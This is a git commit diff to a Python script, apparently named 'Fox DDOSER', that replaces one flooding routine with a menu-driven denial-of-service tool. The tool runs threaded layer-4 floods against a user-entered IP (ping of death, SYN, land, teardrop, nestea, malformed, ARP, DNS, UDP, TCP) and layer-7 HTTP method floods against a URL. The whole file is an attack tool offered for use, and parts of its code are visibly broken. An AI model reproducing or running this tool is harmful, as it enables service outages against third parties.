7d990017c08430e627520486df71b55eb0a3efac
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-22 20:06:04 +0300

    Update F-Tool.py

--- F-Tool.py
+++ F-Tool.py
@@ -85,74 +85,234 @@ url_chek =requests.get(url)
 ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
 print(ip)
 time.sleep(2.5)
-#########################################################################
-# MAIN MENU 
-print()
-ip = str(input("\033[94m╔═══\033[91m[ IP ] •\n\033[94m╠══>\033[0m "))
-port = int(input("\033[94m╠═══\033[91m[ PORT ] •\n\033[94m╠══>\033[0m "))
-pack = int(input("\033[94m╠═══\033[91m[ Packet/s ] •\n\033[94m╠══>\033[0m "))
-thread = int(input("\033[94m╠═══\033[91m[ Threads ] •\n\033[94m╠══>\033[0m "))
-clear()
 print("\033[94m")
 #########################################################################
 
 fake_ip = '77.109.33.232'
 
-useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
-"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
-"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
-"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
-"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
-"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
-"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
-"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
-"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
-"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
-"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
-ref=['http://www.bing.com/search?q=',
-'https://www.yandex.com/yandsearch?text=',
-'https://duckduckgo.com/?q=']
-acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-"Accept-Encoding: gzip, deflate\r\n",
-"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
-"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-"Accept-Language: en-US,en;q=0.5\r\n"]
+from scapy.all import *
+import socket
+import threading
+import random
+import pyuseragents
+import requests
+from rainbowtext import text as rain
+import pyfiglet , colorama
+
+rd = colorama.Fore.RED
+cv = colorama.Fore.WHITE
+bl = colorama.Fore.BLUE
+gn = colorama.Fore.GREEN
+yl = colorama.Fore.YELLOW
+mag = colorama.Fore.MAGENTA
+cy = colorama.Fore.CYAN
+lgn = colorama.Fore.LIGHTGREEN_EX
+
+def banner():
+    figlet = pyfiglet.Figlet(font="script").renderText("Fox DDOSER")
+    return figlet
 
 
-def start():
-    global useragents, ref, acceptall
-    hh = random._urandom(3016)
-    xx = int(0)
-    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
-    accept = random.choice(acceptall)
-    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
-    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-    main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
+
+
+def ping_of_death(ip_target):
+    i = 0
     while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((str(ip),int(port)))
-            s.send(str.encode(main_req))
-            for i in range(pack):
-                s.send(str.encode(main_req))
-            xx += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
-        except:
-            s.close()
-            print('[+] Server Down.')
+        send(IP(dst=ip_target , ttl=132 , id=1111)/ICMP()/(b"Sdadad"*8192) , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def syn_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target,id=1111,ttl=99)
+        tcp = TCP(sport=RandShort() , dport=80 ,seq=12345,ack=1000,windows=1000, flags="S")
+        data = b"MRadikal" * 8192
+        send(ip / tcp / data , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def malformed_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target , ihl=2 , version=3 , ttl=52 , id=112)
+        icmp = ICMP()
+        send(ip / icmp , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def land_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target,src=ip_target , id=78 , ttl=92)
+        tcp = TCP(sport=135,dport=135)
+        send(ip / tcp , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
 
-for x in range(thread):
-    thred = threading.Thread(target=start)
-    thred.start()
+def nestea_attack(ip_target):
+    i =0 
+    while True:
+        ip = ip(dst=ip_target,id=42,flags="MF")
+        data = b"ZZZZ" * 1024
+        send(ip / UDP() / data , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def udp_attack(ip_target):
+    i=0
+    while True:
+        ip = IP(dst=ip_target)
+        udp = fuzz(UDP())
+        send(ip / udp , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def arp_attack(ip_target):
+    ether = Ether(dst="FF:FF:FF:FF:FF:FF")
+    arp = ARP(psrc=RandIP , pdst=ip_target)
+    srpflood(ether / arp)
+        
+def teardrop_attack(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target,flags=0,proto=17,frags=3)
+        data = ("\x00" * 100)
+        ips = IP(dst=ip_target,flags="MF",proto=17,frag=18)
+        send(ip / data , verbose=0)
+        send(ips / data , verbose=0)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 2
+
+def dns_spoofing(ip_target):
+    i = 0
+    while True:
+        ip = IP(dst=ip_target , ttl=12)
+        udp = UDP(sport=RandShort() , dport=53)
+        dns = DNS(qd=DNSQR(qname="secdev.org",qtype="A"))
+        send(ip / udp / dns)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+
+
+
+def tcp_attack(ip_target):
+    sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+    sent = 0
+    port = 80
+    while True:
+        bytes = random._urandom(1769)
+        sock.sendto(bytes, (ip_target,port))
+        sent = sent + 1
+        port = port + 1
+        print ("Sent %s packet to %s on port:%s"%(sent,ip_target,port) , end="\r")
+        if port == 65534:
+            port = 1
+
+def GET_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent":useragent}
+    i = 0
+    while True:
+        requests.get(url_target , headers=header)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+
+def POST_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent":useragent}
+    i = 0
+    while True:
+        requests.post(url_target , headers=header)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+
+def HEAD_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent":useragent}
+    i = 0
+    while True:
+        requests.head(url_target , headers=header)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+def PUT_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent":useragent}
+    print ("Sent : %s\n" % str(i) , end="\r")
+    i = 0
+    while True:
+        requests.put(url_target , headers=header)
+        print ("Sent : %s\n" % str(i))
+        i = i + 1
+def OPTIONS_attack(url_target):
+    useragent = pyuseragents.random()
+    header = {"User-Agent":useragent}
+    i = 0
+    while True:
+        requests.options(url_target , headers=header)
+        print ("Sent : %s\n" % str(i) , end="\r")
+        i = i + 1
+
+
+print(rain(banner()))
+print (rain("""
+|==============================|
+|         Black Fox            |
+|       Security Team          |
+|  Author : Maximum Radikali   |
+|    DDOSER Layer 4 , Layer 7  |
+|==============================|
+"""))
+layer = input(cy + "[-] layer4\n[-] layer7\n\n ~ Select a layer to continue -> ")
+
+if layer == "layer4":
+    ip_target = input(rd + "Please Enter Your Target IP - > ")
+    socketx = int(input(yl + "Please Enter Socket Worker ex : (10) - > "))
+    methods = input(gn + "[^] pod\n[^] syn\n[^] mfd (malformed Attack)\n[^] land\n[^] arp\n[^] nestea\n[^] dns\n[^] tear (Tear Drop Attack)\n[^] tcp\n[^] udp\n\n[~] Please Enter a method : ")
+    if methods == "pod":
+        for i in range(socketx):
+            threading.Thread(target=ping_of_death , args=(ip_target,)).start()
+    elif methods == "syn":
+        for i in range(socketx):
+            threading.Thread(target=syn_attack() , args=(ip_target,)).start()
+    elif methods == "mfd":
+        for i in range(socketx):
+            threading.Thread(target=malformed_attack , args=(ip_target,)).start()
+    elif methods == "land":
+        for i in range(socketx):
+            threading.Thread(target=land_attack , args=(ip_target,)).start()
+    elif methods == "arp":
+        print ("Attacking Start Now  .... !")
+        for i in range(socketx):
+            threading.Thread(target=arp_attack , args=(ip_target,)).start()
+    elif methods == "nestea":
+        for i in range(socketx):
+            threading.Thread(target=nestea_attack , args=(ip_target,)).start()
+    elif methods == "dns":
+        for i in range(socketx):
+            threading.Thread(target=dns_spoofing , args=(ip_target,)).start()
+    elif methods == "tear":
+        for i in range(socketx):
+            threading.Thread(target=teardrop_attack , args=(ip_target,)).start()
+    elif methods == "udp":
+        for i in range(socketx):
+            threading.Thread(target=udp_attack , args=(ip_target,)).start()
+    elif methods == "tcp":
+        for i in range(socketx):
+            threading.Thread(target=tcp_attack , args=(ip_target,)).start()
+if layer == "layer7":
+    url_target = input(bl + "[-] Please Enter Your Target URL : ")
+    worker = int(input(mag + "[=] Please Enter Your Thread Worker : "))
+    methods = input(lgn + "[$] GET\n[$] POST\n[$] PUT\n[$] HEAD\n[$] OPTIONS\n\n[*] Please Enter a Method : ")
+    if methods == "GET":
+        for x in range(worker):
+            threading.Thread(target=GET_attack,args=(url_target,)).start()
+    if methods == "POST":
+        for x in range(worker):
+            threading.Thread(target=POST_attack,args=(url_target,)).start()
+    if methods == "PUT":
+        for x in range(worker):
+            threading.Thread(target=PUT_attack,args=(url_target,)).start()
+    if methods == "HEAD":
+        for x in range(worker):
+            threading.Thread(target=HEAD_attack,args=(url_target,)).start()
+    if methods == "OPTIONS":
+        for x in range(worker):
+            threading.Thread(target=OPTIONS_attack,args=(url_target,)).start()
 #print('Atacando porta 💥')
 
